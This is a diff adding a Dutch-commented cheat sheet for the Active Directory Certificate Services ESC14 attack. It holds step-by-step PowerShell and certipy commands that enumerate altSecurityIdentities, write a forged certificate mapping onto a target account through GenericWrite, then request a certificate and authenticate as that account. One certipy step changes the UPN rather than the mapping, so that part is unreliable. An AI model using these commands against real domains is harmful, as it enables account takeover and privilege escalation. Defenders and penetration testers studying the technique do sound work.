@@ -1,0 +1,28 @@
+# AD CS ESC14 - Weak Explicit Certificate Mappings
+# Explicit mappings via altSecurityIdentities attribuut zijn zwak geconfigureerd
+# Aanvaller met GenericWrite op een account kan de mapping manipuleren
+# Achtergrond: altSecurityIdentities bepaalt welk certificaat bij welk account hoort
+# Zwakke mapping schemas: Issuer+SerialNumber, Subject, SHA1 hash van public key
+# Vereisten:
+# - GenericWrite op target account, OF
+# - GenericWrite op een account waarvan je de mapping kunt hergebruiken
+# - Template met client authentication
+# Stap 1: Enumerate accounts met altSecurityIdentities
+Get-ADUser -Filter {altSecurityIdentities -like "*"} -Properties altSecurityIdentities | Select Name, altSecurityIdentities
+Get-ADComputer -Filter {altSecurityIdentities -like "*"} -Properties altSecurityIdentities | Select Name, altSecurityIdentities
+# Stap 2: Check het mapping schema type
+# X509:<I>issuer<SR>serial = Issuer+Serial (zwak als je GenericWrite hebt op het account)
+# X509:<S>subject = Subject mapping (zwak)
+# X509:<SKI>keyid = Subject Key Identifier
+# X509:<SHA1-PUKEY>hash = SHA1 public key hash
+# Stap 3a: Via GenericWrite op target — voeg eigen cert mapping toe
+Set-ADUser -Identity target_user -Add @{altSecurityIdentities="X509:<I>DC=local,DC=domain,CN=domain-CA<SR>SERIAL_NUMBER"}
+# Stap 3b: Via certipy
+certipy account update -u user@domain.local -p Password123! -user target_user -upn target_user@domain.local
+# Stap 4: Request certificaat dat matcht met de mapping
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template User
+# Stap 5: Authenticate — certificaat wordt via explicit mapping gekoppeld aan target
+certipy auth -pfx user.pfx -domain domain.local -dc-ip DC_IP
+# Tip: ESC14 vereist begrip van de specifieke mapping schema's
+# Tip: Full enforcement mode (KB5014754) beperkt zwakke mappings
+# Tip: Prioriteit van mapping: explicit > implicit (UPN/SAN)
